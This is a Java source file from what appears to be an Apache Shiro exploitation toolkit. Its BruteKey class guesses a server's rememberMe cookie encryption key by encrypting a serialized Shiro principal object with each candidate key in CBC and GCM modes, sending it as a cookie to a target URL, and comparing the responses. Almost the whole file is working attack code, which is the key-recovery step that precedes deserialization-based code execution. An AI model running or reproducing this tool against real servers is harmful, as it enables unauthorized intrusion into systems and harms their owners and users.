package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.request.HttpRequest;
import com.y5neko.shiroexp.request.ResponseOBJ;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class BruteKey {
    public static byte[] byteMerger(byte[] a, byte[] b) {
        byte[] c = new byte[a.length + b.length];
        System.arraycopy(a, 0, c, 0, a.length);
        System.arraycopy(b, 0, c, a.length, b.length);
        return c;
    }

    private static byte[] pad(byte[] s) {
        s = byteMerger(s, charToByte((char)(16 - s.length % 16)));
        return s;
    }

    private static byte[] charToByte(char c) {
        byte[] b = new byte[2];
        b[0] = (byte)((c & 0xFF00) >> 8);
        b[1] = (byte)(c & 0xFF);
        return b;
    }

    public static String CBC_Encrypt(String key, String checkdata) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        String ALGORITHM = "AES";
        String TRANSFORMATION = "AES/CBC/PKCS5Padding";

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);

        // 解码base64
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] checkdata_raw = decoder.decode(checkdata);
        byte[] key_raw = decoder.decode(key);

        // 生成AES密钥
        SecretKeySpec keySpec = new SecretKeySpec(key_raw, ALGORITHM);

        // 生成IV向量
        byte[] ivBytes = new byte[16]; // IV长度和块大小相同（对于AES是16字节）
        new SecureRandom().nextBytes(ivBytes);
        IvParameterSpec iv = new IvParameterSpec(ivBytes);

        // 首先加密得到校验数据字节码
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);
        byte[] encrypted_raw = cipher.doFinal(checkdata_raw);
        // 然后拼接向量字节码和校验数据字节码，得到最终数据
        byte[] payload_raw = byteMerger(ivBytes, encrypted_raw);

        // base64编码一次
        return Base64.getEncoder().encodeToString(payload_raw);
    }

    public static String GCM_Encrypt(String key, String checkdata) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        String ALGORITHM = "AES";
        String TRANSFORMATION = "AES/GCM/NoPadding";

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);

        // 解码base64
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] checkdata_raw = decoder.decode(checkdata);
        byte[] key_raw = decoder.decode(key);

        // 生成AES密钥
        SecretKeySpec keySpec = new SecretKeySpec(key_raw, ALGORITHM);

        // 生成IV向量
        byte[] ivBytes = new byte[16]; // 对于GCM是12字节
        new SecureRandom().nextBytes(ivBytes);

        // 生成GCM签名
        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, ivBytes);     //TAG长度一般为128
//        System.out.println(Arrays.toString(gcmParameterSpec.getIV()));

        // 首先加密得到校验数据字节码
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmParameterSpec);
        byte[] encrypted_raw = cipher.doFinal(pad(checkdata_raw));
        // 然后拼接GCM认证标签字节码
        byte[] payload_raw = byteMerger(ivBytes, encrypted_raw);

        return Base64.getEncoder().encodeToString(payload_raw);
    }

    /**
     * @param url 目标地址
     * @return 正确的key
     */
    public static KeyInfo bruteKey(String url) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        return bruteKey(url, "rememberMe");
    }

    /**
     * key爆破模块
     * @param url 目标地址
     * @param rememberMeString 自定义rememberMe字段名
     * @return 正确的key
     */
    public static KeyInfo bruteKey(String url, String rememberMeString) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        String key;
        String checkData = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==";
        String[] keys = Tools.multiLoadFile("./misc/keys.txt");
        KeyInfo keyInfo = new KeyInfo();

        for (int i = 0; i < keys.length; i++) {
            String payload_cbc = rememberMeString + "=" + CBC_Encrypt(keys[i], checkData);
            String payload_gcm = rememberMeString + "=" + GCM_Encrypt(keys[i], checkData);

            System.out.println("[" + Tools.color("INFO", "BLUE") + "] " + "正在尝试key: " + keys[i]);

            Map<String, String> headers_123 = new HashMap<>();
            headers_123.put("Cookie", rememberMeString + "=" + "123");
            ResponseOBJ response_123 = HttpRequest.httpRequest(url, null, headers_123, "GET");

            Map<String, String> headers_cbc = new HashMap<>();
            headers_cbc.put("Cookie", payload_cbc);
            ResponseOBJ response_cbc = HttpRequest.httpRequest(url, null, headers_cbc, "GET");

            Map<String, String> headers_gcm = new HashMap<>();
            headers_gcm.put("Cookie", payload_gcm);
            ResponseOBJ response_gcm = HttpRequest.httpRequest(url, null, headers_gcm, "GET");

            if (response_123 != null && response_cbc != null && response_gcm != null) {
                int length_123 = response_123.getHeaders().size();
                int length_cbc = response_cbc.getHeaders().size();
                int length_gcm = response_gcm.getHeaders().size();

                if (length_cbc != length_123 && response_cbc.getStatusCode() != 400 && response_cbc.getHeaders().get("Set-Cookie") == null) {
                    key = keys[i];
                    keyInfo.setKey(key);
                    keyInfo.setType("CBC");
                    break;
                }
                if (length_gcm != length_123 && response_gcm.getStatusCode() != 400 && response_gcm.getHeaders().get("Set-Cookie") == null){
                    key = keys[i];
                    keyInfo.setKey(key);
                    keyInfo.setType("GCM");
                    break;
                }
            }
        }
        return keyInfo;
    }

    public static void main(String[] args) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        KeyInfo key = bruteKey("http://127.0.0.1:8080/login");
        System.out.println(key);
    }
}

